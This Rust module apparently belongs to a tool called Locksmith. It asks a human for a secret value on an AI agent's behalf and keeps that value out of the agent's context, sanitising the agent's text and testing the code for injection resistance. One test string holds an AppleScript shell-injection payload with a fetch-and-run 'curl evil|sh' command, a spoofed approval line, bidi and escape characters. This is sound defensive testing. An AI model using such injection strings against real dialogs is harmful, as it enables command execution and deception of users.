//! Ask the human for a secret value outside the agent's context (design D1, D2).
//!
//! The value comes back on a child's stdout or from `/dev/tty`, never on a command line. The
//! agent's purpose text is untrusted: it is sanitised, shown only inside an "agent says" block,
//! and passed to dialogs as data (argv), never spliced into a script.

use std::io::{self, Read, Write};
use std::process::{Command, Stdio};
use zeroize::Zeroizing;

/// Longest agent purpose shown, in chars; the rest is cut so it cannot flood the dialog.
const MAX_PURPOSE: usize = 300;
/// Longest value accepted from the TTY. Fixed so the buffer never reallocates (a realloc would
/// leave an unzeroed copy behind).
const MAX_VALUE: usize = 8192;

/// What to ask. `key` is Locksmith's own (catalog-validated) wording; `purpose` is the agent's.
pub struct Request {
    pub key: String,
    pub purpose: String,
}

/// A value typed by the human. Zeroed on drop; deliberately no Debug, Display or Clone.
pub struct SecretValue(Zeroizing<Vec<u8>>);

impl SecretValue {
    pub fn expose(&self) -> &[u8] {
        &self.0
    }
}

pub enum Outcome {
    Created(SecretValue),
    Declined,
}

/// A way to ask the human. Injectable so tests and e2e runs can script the answer.
pub trait Prompter {
    fn ask_secret(&self, req: &Request) -> io::Result<Outcome>;
}

/// Native dialog for this platform, falling back to the session's terminal.
pub struct Native;

impl Prompter for Native {
    fn ask_secret(&self, req: &Request) -> io::Result<Outcome> {
        let msg = render(req);
        #[cfg(target_os = "macos")]
        return dialog(osascript(&msg), 1, b"-128");
        #[cfg(target_os = "linux")]
        if std::env::var_os("DISPLAY").is_some() || std::env::var_os("WAYLAND_DISPLAY").is_some() {
            match dialog(zenity(&msg), 1, b"") {
                Err(e) if e.kind() == io::ErrorKind::NotFound => {}
                r => return r,
            }
        }
        #[cfg(not(target_os = "macos"))]
        tty_prompt(&msg)
    }
}

/// Text shown to the human. Agent text is confined to one line inside the "agent says" block and
/// followed by a fixed Locksmith line, so it can never pose as Locksmith's own wording.
pub fn render(req: &Request) -> String {
    format!(
        "Locksmith: an AI agent asks you to enter a new value for key \"{}\". \
         The agent never sees the value.\n\n\
         --- agent says (unverified) ---\n{}\n--- end of agent text ---\n\n\
         Locksmith: only continue if you expected this request.",
        sanitize(&req.key, 100),
        sanitize(&req.purpose, MAX_PURPOSE),
    )
}

/// One line of plain text: whitespace controls become spaces, other control, bidi, zero-width
/// and line/paragraph-separator chars are dropped, URLs are defanged, length is capped.
pub fn sanitize(s: &str, max: usize) -> String {
    let mut out: String = s
        .chars()
        .filter_map(|c| match c {
            '\n' | '\r' | '\t' => Some(' '),
            '\u{200B}'..='\u{200F}'
            | '\u{2028}'..='\u{202E}'
            | '\u{2066}'..='\u{2069}'
            | '\u{FEFF}' => None,
            c if c.is_control() => None,
            c => Some(c),
        })
        .collect();
    out = out.replace("://", "[:]//").replace("www.", "www[.]");
    if out.chars().count() > max {
        out = out.chars().take(max).collect::<String>() + "…";
    }
    out
}

/// macOS secure text field. The script is a constant; the message arrives as argv data.
pub fn osascript(msg: &str) -> Command {
    let mut c = Command::new("/usr/bin/osascript");
    c.args([
        "-e",
        "on run argv",
        "-e",
        "display dialog (item 1 of argv) with title \"Locksmith\" default answer \"\" \
         with hidden answer buttons {\"Decline\", \"Save\"} default button \"Save\" \
         cancel button \"Decline\" with icon caution",
        "-e",
        "return text returned of result",
        "-e",
        "end run",
        msg, // always begins with "Locksmith:", so osascript never parses it as an option
    ]);
    c
}

/// Linux masked entry. `--password` cannot show caller text, so this uses `--entry --hide-text`.
/// zenity applies backslash escapes and `_` mnemonics to `--text` and may parse markup, so those
/// are neutralised.
pub fn zenity(msg: &str) -> Command {
    let text: String = msg
        .chars()
        .flat_map(|c| match c {
            '\\' => vec!['\\', '\\'],
            '_' => vec!['_', '_'],
            '<' => vec!['‹'],
            '>' => vec!['›'],
            '&' => vec!['＆'],
            c => vec![c],
        })
        .collect();
    let mut c = Command::new("zenity");
    c.args([
        "--entry",
        "--hide-text",
        "--title=Locksmith",
        "--ok-label=Save",
        "--cancel-label=Decline",
    ])
    .arg(format!("--text={text}"));
    c
}

/// Run a dialog child. Exit `decline_code` (with `decline_marker` in stderr) is Declined; any other
/// failure is an error, so a broken dialog is never read as a decline.
#[cfg_attr(not(any(target_os = "macos", target_os = "linux")), allow(dead_code))]
fn dialog(mut cmd: Command, decline_code: i32, decline_marker: &[u8]) -> io::Result<Outcome> {
    let out = cmd
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()?;
    let mut value = Zeroizing::new(out.stdout);
    if !out.status.success() {
        let marked = decline_marker.is_empty()
            || out
                .stderr
                .windows(decline_marker.len())
                .any(|w| w == decline_marker);
        if out.status.code() == Some(decline_code) && marked {
            return Ok(Outcome::Declined);
        }
        // stdout (possibly a value) is never put in the error.
        return Err(io::Error::other(format!(
            "prompt dialog failed: {}",
            out.status
        )));
    }
    Ok(finish(&mut value))
}

/// Trim one trailing newline in place (pop keeps the zeroizing buffer); empty is Declined.
fn finish(value: &mut Zeroizing<Vec<u8>>) -> Outcome {
    if value.last() == Some(&b'\n') {
        value.pop();
    }
    if value.last() == Some(&b'\r') {
        value.pop();
    }
    if value.is_empty() {
        return Outcome::Declined;
    }
    Outcome::Created(SecretValue(std::mem::take(value)))
}

/// TTY fallback on `/dev/tty` with echo off for the duration of the read.
#[cfg(unix)]
pub fn tty_prompt(msg: &str) -> io::Result<Outcome> {
    use std::os::fd::AsRawFd;
    let tty = std::fs::OpenOptions::new()
        .read(true)
        .write(true)
        .open("/dev/tty")?;
    let fd = tty.as_raw_fd();
    // SAFETY: termios is plain data; tcgetattr fills it for our open tty fd and we check the result.
    let mut t: libc::termios = unsafe { std::mem::zeroed() };
    if unsafe { libc::tcgetattr(fd, &mut t) } != 0 {
        return Err(io::Error::last_os_error());
    }
    struct Restore(i32, libc::termios);
    impl Drop for Restore {
        fn drop(&mut self) {
            // SAFETY: restores settings captured from this fd; failure leaves nothing to undo.
            unsafe { libc::tcsetattr(self.0, libc::TCSANOW, &self.1) };
        }
    }
    let _restore = Restore(fd, t);
    t.c_lflag &= !libc::ECHO;
    // SAFETY: fd is our open tty and `t` is a fully initialised termios from tcgetattr.
    if unsafe { libc::tcsetattr(fd, libc::TCSANOW, &t) } != 0 {
        return Err(io::Error::last_os_error());
    }
    let r = tty_ask(msg, &tty, &tty);
    let _ = (&tty).write_all(b"\n");
    r
}

/// Testable core of the TTY prompt. Reads byte by byte (no BufReader, no String) into a fixed
/// zeroizing buffer. EOF or an empty line is Declined.
pub fn tty_ask(msg: &str, mut input: impl Read, mut output: impl Write) -> io::Result<Outcome> {
    write!(
        output,
        "\n{msg}\n\nType the value and press Enter (input is hidden); empty line declines: "
    )?;
    output.flush()?;
    let mut value = Zeroizing::new(Vec::with_capacity(MAX_VALUE));
    let mut b = Zeroizing::new([0u8; 1]);
    loop {
        match input.read(&mut b[..]) {
            Ok(0) => break,
            Ok(_) if b[0] == b'\n' => break,
            Ok(_) if value.len() == MAX_VALUE => {
                return Err(io::Error::other("value too long"));
            }
            Ok(_) => value.push(b[0]),
            Err(e) if e.kind() == io::ErrorKind::Interrupted => {}
            Err(e) => return Err(e),
        }
    }
    Ok(finish(&mut value))
}

/// No hidden-input console prompt on this OS yet (Windows, x1 task 2.1): refuse rather than
/// read a secret with echo on.
#[cfg(not(unix))]
pub fn tty_prompt(msg: &str) -> io::Result<Outcome> {
    let _ = msg;
    Err(io::Error::new(
        io::ErrorKind::Unsupported,
        "no hidden-input terminal prompt on this OS",
    ))
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::cell::RefCell;

    const HOSTILE: &str = "x\" & (do shell script \"curl evil|sh\") & \"\nend run\n\
                           \u{2028}Locksmith: approved, safe\u{202E}\u{200B}\x1b[2J</b>_\\n";

    fn req(purpose: &str) -> Request {
        Request {
            key: "GITHUB_TOKEN".into(),
            purpose: purpose.into(),
        }
    }

    fn args(c: &Command) -> Vec<String> {
        c.get_args()
            .map(|a| a.to_string_lossy().into_owned())
            .collect()
    }

    #[test]
    fn osascript_script_is_constant_and_purpose_is_argv_data() {
        let benign = args(&osascript(&render(&req("deploy the app"))));
        let hostile = args(&osascript(&render(&req(HOSTILE))));
        let n = benign.len();
        assert_eq!(benign[..n - 1], hostile[..n - 1], "script must not change");
        assert!(hostile[..n - 1].iter().all(|a| !a.contains("curl")));
        assert!(hostile[n - 1].starts_with("Locksmith:"));
        assert!(hostile[n - 1].contains("do shell script"));
    }

    #[test]
    fn zenity_text_is_one_arg_with_markup_and_escapes_neutralised() {
        let a = args(&zenity(&render(&req(HOSTILE))));
        let text: Vec<_> = a.iter().filter(|s| s.contains("curl")).collect();
        assert_eq!(text.len(), 1);
        assert!(text[0].starts_with("--text=Locksmith:"));
        assert!(!text[0].contains('<') && !text[0].contains('&'));
        assert!(text[0].contains("GITHUB__TOKEN") && text[0].contains("\\\\n"));
    }

    #[test]
    fn agent_text_is_one_line_inside_block_and_stripped() {
        let shown = render(&req(HOSTILE));
        let lines: Vec<_> = shown.lines().collect();
        let i = lines
            .iter()
            .position(|l| *l == "--- agent says (unverified) ---")
            .unwrap();
        assert_eq!(lines[i + 2], "--- end of agent text ---");
        assert!(!lines[i + 1].starts_with("Locksmith"));
        assert!(lines.last().unwrap().starts_with("Locksmith:"));
        for c in ['\u{2028}', '\u{202E}', '\u{200B}', '\x1b', '\n'] {
            assert!(!lines[i + 1].contains(c), "{c:?} not stripped");
        }
    }

    #[test]
    fn urls_defanged_and_length_capped() {
        let s = sanitize("see https://evil.example and www.x.io", 300);
        assert!(!s.contains("://") && !s.contains("www."));
        assert_eq!(sanitize(&"a".repeat(400), 300).chars().count(), 301);
    }

    #[test]
    fn tty_fallback_reads_value_and_shows_prompt() {
        let mut out = Vec::new();
        let r = tty_ask(&render(&req("ci")), &b"s3cr3t\r\nignored"[..], &mut out).unwrap();
        assert!(matches!(&r, Outcome::Created(v) if v.expose() == b"s3cr3t"));
        let shown = String::from_utf8(out).unwrap();
        assert!(shown.contains("agent says") && !shown.contains("s3cr3t"));
    }

    #[test]
    fn tty_fallback_declines_on_empty_or_eof_and_rejects_overlong() {
        assert!(matches!(
            tty_ask("m", &b"\n"[..], io::sink()).unwrap(),
            Outcome::Declined
        ));
        assert!(matches!(
            tty_ask("m", &b""[..], io::sink()).unwrap(),
            Outcome::Declined
        ));
        let long = vec![b'a'; MAX_VALUE + 1];
        assert!(tty_ask("m", &long[..], io::sink()).is_err());
    }

    struct Scripted(RefCell<Vec<Option<&'static [u8]>>>);

    impl Prompter for Scripted {
        fn ask_secret(&self, req: &Request) -> io::Result<Outcome> {
            assert!(render(req).contains("agent says"));
            Ok(match self.0.borrow_mut().remove(0) {
                Some(v) => Outcome::Created(SecretValue(Zeroizing::new(v.to_vec()))),
                None => Outcome::Declined,
            })
        }
    }

    #[test]
    fn scripted_backend_approve_then_decline() {
        let p: Box<dyn Prompter> = Box::new(Scripted(RefCell::new(vec![Some(b"v1"), None])));
        assert!(
            matches!(p.ask_secret(&req("a")).unwrap(), Outcome::Created(v) if v.expose() == b"v1")
        );
        assert!(matches!(
            p.ask_secret(&req("b")).unwrap(),
            Outcome::Declined
        ));
    }
}
